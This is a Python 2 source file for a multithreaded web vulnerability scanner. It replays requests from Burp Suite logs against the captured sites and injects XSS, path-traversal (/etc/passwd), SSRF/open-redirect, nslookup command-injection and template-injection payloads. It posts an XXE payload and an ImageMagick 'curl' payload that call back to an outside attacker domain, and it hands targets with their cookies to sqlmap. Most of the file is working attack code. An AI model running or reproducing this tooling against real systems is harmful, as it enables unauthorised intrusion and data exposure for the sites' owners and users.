#!/usr/bin/env python
#coding=utf-8

import threading
import random
import requests
import copy
import urlparse
import urllib
import re
import json
import base64
import time
import sys
import argparse
from AutoSqli import AutoSqli
import logging
from Queue import Queue
from colorama import *
from classSQL import *

"""
根据网络上的一些脚本，自己改了一下
现在是多线程，对于burpsuite的日志提取出GET方法来，
过滤出一些`txt`, `jpg`等图片，js，css，无关的请求
然后使用 host+path+sorted(请求参数名) 这一个字符串作为去重的条件
得到的结果分别将xss的payload插入到对应的位置上去
再去请求
v1版本，不保证稳定性，只操作GET型的XSS， payload可以自己添加
"""

requests.packages.urllib3.disable_warnings()

_random=str(random.randint(300,182222))
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s ^^^: %(message)s')
logging.getLogger("requests").setLevel(logging.WARNING)
lock = threading.Lock()
# XSS规则
XSS_Rule = {
    "script":[
        "\" onfous=alert(document.domain)\"><\"",
        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
        "\"</script><svg onload=alert`1`>",
        # "../../../../../../../../../../etc/passwd",
        # "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        # "../../../../../../../../../../etc/passwd%00",
        #"././././././././././././././././././././././././../../../../../../../../etc/passwd",
        #";alert(1)//"
        #"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
    ],
    "lfi": [
        "../../../../../../../../../../etc/passwd",
        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "../../../../../../../../../../etc/passwd%00",
    ],
    # URL跳转与SSRF
    "redirect" : [
        'http://www.niufuren.cc/usr.txt', #  Valar Morghulis
        '@www.niufuren.cc/usr.txt', #  Valar Morghulis
    ],

    "cli" : [
        "$(nslookup {domain})",
        '&nslookup {domain}&\'\\"`0&nslookup {domain}&`\'',
        "nslookup {domain}|nslookup {domain}&nslookup {domain}",
        "'nslookup {domain}|nslookup {domain}&nslookup {domain}'",
        '"nslookup {domain}|nslookup {domain}&nslookup {domain}"',
        ";nslookup {domain}|nslookup {domain}&nslookup {domain};"
    ],
    'ssti' : [
        '{{1357924680 * 2468013579}}',
        '${1357924680 * 2468013579}'
    ]
}


XXE_Role = '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\n\n]>\n\n<r>&sp;</r>'

# imageMagick rules
ImageMagick_Rule = 'push graphic-context\nviewbox 0 0 640 480\nimage copy 200,200 100,100 "|curl http://imagemagick_{domain}.devil.yoyostay.top"\npop graphic-context'


# 文件包含规则


def getLinks(filename):
    # 得到url, headers->{"cookie", "Referer", "User-Agent"}
    result = {}
    no_repeat = set()
    DEBUG = True
    with open(filename, 'rb') as f:
        content=f.read()
        blocks = re.split("======================================================[\n|\r\n]", content)
        for index, block in enumerate(blocks):

            tmp = re.split("[\n|\r\n]", block)

            # continue
            if (len(tmp) < 3):
                continue
            if (not tmp[1].startswith("GET")) and (not tmp[1].startswith("POST")):
                # filter non get / POST request
                continue
            
            # print tmp
            # else:
            #     try:
            #         _ = tmp[0].split(" ")[1]
            #         if not checkType(_):
            #             continue
            #     except:
            #         return result
            path = ""
            host = ""
            headers = {"Cookie": "", "User-Agent": ""}
            # print tmp
            # continue
            for _ in tmp:
                if _.startswith("GET") or _.startswith("POST"):
                    # 以防格式不对，多出来一个请求头
                    if path == "":
                        path = _.split(" ")[1]
                    else:
                        break
                if _.startswith("Host"):
                    #print _.split(":")[1]
                    host = _.split(":")[1].strip()
                if _.startswith("User-Agent"):
                    headers["User-Agent"] = _.split(":")[1].strip()
                if _.startswith("Referer"):
                    headers["Referer"] = "".join(_.split(":")[1:]).strip()
                if _.startswith("Cookie"):
                    headers["Cookie"] = _.split(":")[1].strip()
                if _.startswith("Accept-Language"):
                    headers['Accept-Language'] = _.split(":")[1].strip()

            # 去重，利用域名，目录， 和参数的sort值来判断，如果相同就忽略
            # 否则就加入到no_repeat里
            url = "http://" + host + path
            if not checkRepeat(url, no_repeat):
                result[index] = {}
                result[index]["url"] = url
                result[index]["headers"] = headers
                if tmp[0].startswith("POST"):
                    result[index]["data"] = tmp[-1]
            else:
                continue
        print "The length: {0}".format(len(result))
        return result

def checkType(path):
    if path.split("?")[0].split(".")[-1] in (("f4v","bmp","bz2","css","doc","eot","flv","gif","gz","ico","jpeg","jpg","js","less","mp3", "mp4", "pdf","png","rar","rtf","swf","tar","tgz","txt","wav","woff","xml","zip")):
        return False
    else:
        return True

def checkRepeat(host, no_repeat=None):
    try:
        url_node = urlparse.urlparse(host)
        query_dict = urlparse.parse_qs(url_node.query)
        param = "".join(sorted(query_dict.keys()))
        host = url_node.netloc
        path = url_node.path
        # host + path + param 来判断是否存在
        tmp = host + path + param
        if tmp in no_repeat:
            return True
        else:
            no_repeat.add(tmp)
            return False
    except Exception as e:
        return True


def _init_get_url(url_group,rules,inqueue):

    for key in url_group.keys():
        # 一旦发现data,即post请求，那么就continue
        if "data" in url_group[key]:
            _url_item = url_group[key]["url"]
            headers = url_group[key]["headers"]
            headers['Content-Type'] = 'application/xml'
            # url_node = urlparse.urlparse(_url_item)
            domain = base64.b64encode(_url_item)
            domain = domain.rstrip("=")
            # domain = _url_item.replace(".", "_").replace(":", "_").replace("/", "_")
            inqueue.put({'action': _url_item, 'input': XXE_Role.replace('{domain}', domain), 'method': 'post', 'regex': None, 'headers': headers, 'type': 'xxe'})
            

            # to use files upload, must delete the content-type key in headers
            headers.pop('Content-Type', None)
            inqueue.put({'action': _url_item, 'input': ImageMagick_Rule.replace('{domain}', domain),
                'method': 'post', 'regex': None, 'headers': headers, 'type': 'imagemagick'})
        else:
            _url_item = url_group[key]["url"]
            headers = url_group[key]["headers"]
            url_node = urlparse.urlparse(_url_item)
            uquery = url_node.query
            # 对于无参数的请求，直接将文件包含的payload放在路径后边
            if not uquery:
                for _rule in rules['lfi']:
                    if not _url_item.endswith("/"):
                        _url_item = _url_item + "/"
                    inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': "root:x:0", 'headers': headers, 'type': 'lfi'})
                # for rule_item in rules.keys():
                # # 添加属于ssrf/URL跳转的规则,
                #     for _rule in rules[rule_item]:
                #         if 'passwd' in _rule:
                #             if not _url_item.endswith("/"):
                #                 _url_item = _url_item + "/"
                #             inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': _rule, 'headers': headers, 'type': 'lfi'})

                continue
            url_parse = _url_item.replace('?'+uquery, '')
            query_dict = dict(urlparse.parse_qsl(uquery))

            for rule_item in rules.keys():
                for _rule in rules[rule_item]:
                    for parameter_item in query_dict.keys():
                        tmp_dict = copy.deepcopy(query_dict)
                        if rule_item == 'cli':
                            # domain = url_node.netloc.replace(".", "_").replace(":", "_") + "_" + url_node.path.replace("/", "_")
                            domain = base64.b64encode(url_node.netloc + "/" + url_node.path)
                            # remove the last = or == in base64 encode
                            domain = domain.rstrip('=')
                            _rule = _rule.replace('{domain}', domain)
                        # if rule_item == "lfi":


                        tmp_dict[parameter_item] = _rule
                        tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict)).replace('+','%20')
                        if "lfi" == rule_item:
                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': "root:x:0", 'headers': headers, 'type': 'lfi'})
                        if 'usr' in _rule:
                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'usr'})
                        elif 'nslookup' in _rule:
                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'cli'})
                        elif "1357924680" in _rule:
                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': '3351376549499229720',  'headers': headers, 'type': 'ssti'})
                        else:
                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'xss'})




class detectXSS(threading.Thread):
    """docstring for detectXSS"""
    def __init__(self, inqueue, outqueue, delay):
        threading.Thread.__init__(self)
        self.inqueue =  inqueue
        self.outqueue = outqueue
        self.delay = delay

    def run(self):
        while True:
            time.sleep(self.delay)
            if self.inqueue.empty():
                break
            try:
                # if flag:
                #     self.inqueue.get()
                #     continue
                logging.info(Fore.YELLOW + 'Remains: {} items>'.format(self.inqueue.qsize()) + Style.RESET_ALL)
                target = self.inqueue.get(timeout=3)
                if target["method"] == "post":
                    self.request_do(target['action'], target['input'], target['regex'], target['headers'], target['type'])
                    continue
                if self.request_do(target['action'],None,target['regex'], target["headers"], target['type']):
                    logging.info(Fore.RED + "[*][GET] Find One Of XSS/LFI/SSRF/URL_Redirect: %s" % target['action'] + Style.RESET_ALL)
                    self.outqueue.put(target["action"])
                    lock.acquire()
                    with open("find_xss.txt", "a") as f:
                        f.write(target["action"] + "\n")
                    lock.release()
            except Exception as e:
                pass


    def request_do(self, url, _data, _regex, headers, type):
        TIMEOUT=5
        _bool = False
        """
        if "Connection" in headers:
            if headers["Connection"] == "close":
                pass
            else:
                headers["Connection"] = "close"
        else:
            headers["Connection"] = "close"
        """
        headers['Connection'] = "close"
        #if type == 'ssrf':
        #    logging.info("[-] Dealing type: {}".format(type))
        #logging.info("[-] Requesting " + url)
        try:
            if _data is not None:
                if type == 'imagemagick':
                    for name in ['imgFile', 'imgSrc', 'file', 'fileField']:
                        files = {name : ('image.png', _data, 'image/png')}
                        req = requests.post(url, headers=headers, files=files, verify=False, timeout=TIMEOUT)
                        # global flag 
                        # flag = True
                else:
                    req = requests.post(url,data=_data,timeout=TIMEOUT, headers=headers, verify=False)
                return _bool
            else:
                # 如果ssrf或者URL跳转问题，那么允许其跳转
                if type == 'usr':
                    req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False, allow_redirects=True)
                    req_result = "".join(req.content.split('\n'))
                    if req_result.find('Valar Morghulis') > 0:
                        _bool=True
                        logging.info('[*] [ssrf/url redirect] FOUND!!')
                    return _bool

                else:
                    req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False)
            
            if type == 'cli':
                return _bool
            if (req.headers["Content-Type"].split(";")[0]  in ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]):
                return _bool
            req_result = ''.join(req.content.split('\n'))

            if req_result.find(_regex) > 0:
                _bool = True
            
            # return _bool
            # if "passwd" in _regex:
            #     if req_result.find('root:x:') > 0:
            #         _bool=True

            # elif req_result.find(_regex) != -1:
            #     _bool = True
        except Exception, e:
            logging.error("[!!] [request_do]\t" + str(e))
            return _bool
        return _bool

def autoSqli(dict_result):
    sqlmapapi = "http://10.110.28.13:8088"
    for index in dict_result.keys():
        target = dict_result[index]["url"]
        if "Cookie" in dict_result[index]["headers"]:
            cookie = dict_result[index]["headers"]["Cookie"]
        else:
            cookie = None

        if "data" in dict_result[index]:
            data = dict_result[index]["data"]
        else:
            data = None

        #print "-------" , data
        if "soaiymp3" in target:
            print target
        a = AutoSqli(sqlmapapi, target, data=data, cookie=cookie)

        a.createNewTask()
        a.optionSet()




def start_point(args):
    filename = args.file
    threadNum = args.threads
    delay = args.delay
    inqueue = Queue()
    outqueue = Queue()
    # 增加文件是否存在的校验
    dict_result = getLinks(filename)
    # sys.exit(0)
    # # 将action结尾的URL放入同一个URL，这样以后再出现struts漏洞时，就可以用的上了
    with open("action.lst", "a") as f:
        for i in dict_result.keys():
            _ = urlparse.urlparse(dict_result[i]["url"])
            if "action" in _.path or "do" in _.path:
                f.write(dict_result[i]["url"] + "\n")


    #print dict_result
    #with open("test.json", "w") as f:
    #    json.dump(dict_result.encode("utf-8"), f)
    # 对所有请求都POST到SQLMAPAPI中去
    #autoSqli(dict_result)
    #sys.exit(0)
    # XSS/LFI scan
    _init_get_url(dict_result, XSS_Rule, inqueue)
    logging.info("[-] Totally {0} requests".format(inqueue.qsize()))
    # time.sleep(3)
    threads = []
    # 30个线程来跑
    for i in xrange(threadNum):
        thd = detectXSS(inqueue, outqueue, delay)
        #thd.setDaemon(True)
        threads.append(thd)

    for thd in threads:
        thd.start()

    for thd in threads:
        if thd.is_alive():
            thd.join()

    while not outqueue.empty():
        print "[+] [GET]:\t" + Fore.GREEN + outqueue.get() + Style.RESET_ALL

    # print "[-][-] Done!"
    # use classSQL to scan the error-based sqli 
    for index in dict_result.keys():
        item = dict_result[index]
        url = item['url']
        headers = item['headers']
        data = item['data'] if 'data' in item else None
        time.sleep(3)
        aim_error_list = sqli_test(url, headers, data)
        for i in aim_error_list:
            print "[+] [{}]:\t".format(i[0]) + Fore.GREEN + "Found SQLi Error-Based Injection=> url:{} =>data:{}".format(i[1], i[2])  + Style.RESET_ALL



def parse_arg():
    parser =  argparse.ArgumentParser()
    parser.add_argument("-t", "--threads", type=int, default=100, help="the threads num, default is 100")
    parser.add_argument("-d", "--delay", type=int, default=0, help="the delay of each request, default is 0")
    parser.add_argument("file",  help="the burpsuite log file")
    args = parser.parse_args()
    # if args.port is None or args.host is None:
    #     parser.print_usage()
    #     exit(0)
    # else:
    return args




# def temp_parse(args):
#     filename = args.file
#     all_links = []
#     with open(filename, 'r') as f:
#         content = f.read()
#         # all_links = [for i in content.split("======================================================") if i.startswith("GET") or i.startswith("POST")]
#         for i in re.split("======================================================[\n|\r\n]", content):
#             print repr(i[:4])
#             if i.startswith("POST") or i.startswith("GET"):
#                 all_links.append(i)

#         print all_links
#         print len(all_links)

if __name__ == '__main__':
    Usage = "python %s target_log" %(sys.argv[0])

    try:
        args = parse_arg()
    except:
        print Usage
        exit(0)
    start_point(args)

    # filename = sys.argv[1]
    # inqueue = Queue()
    # outqueue = Queue()
    # # 增加文件是否存在的校验
    # dict_result = getLinks(filename)
    # # sys.exit(0)
    # # 将action结尾的URL放入同一个URL，这样以后再出现struts漏洞时，就可以用的上了
    # with open("action.lst", "a") as f:
    #     for i in dict_result.keys():
    #         _ = urlparse.urlparse(dict_result[i]["url"])
    #         if "action" in _.path or "do" in _.path:
    #             f.write(dict_result[i]["url"] + "\n")


    # #print dict_result
    # #with open("test.json", "w") as f:
    # #    json.dump(dict_result.encode("utf-8"), f)
    # # 对所有请求都POST到SQLMAPAPI中去
    # #autoSqli(dict_result)
    # #sys.exit(0)
    # # XSS/LFI scan
    # _init_get_url(dict_result, XSS_Rule, inqueue)
    # logging.info("[-] Totally {0} requests".format(inqueue.qsize()))
    # time.sleep(3)
    # threads = []
    # # 30个线程来跑
    # for i in xrange(100):
    #     thd = detectXSS(inqueue, outqueue)
    #     #thd.setDaemon(True)
    #     threads.append(thd)

    # for thd in threads:
    #     thd.start()

    # for thd in threads:
    #     if thd.is_alive():
    #         thd.join()
    # """
    # count = 0
    # # 最高30分钟?
    # while True:
    #     for thd in threads:
    #         if thd.is_alive():
    #             time.sleep(1)
    #         else:
    #             count += 1
    #     if count == 30:
    #         break
    # """

    # # 输出outqueue的内容
    # while not outqueue.empty():
    #     print "[+] [GET]:\t" + Fore.GREEN + outqueue.get() + Style.RESET_ALL

    # print "[-][-] Done!"


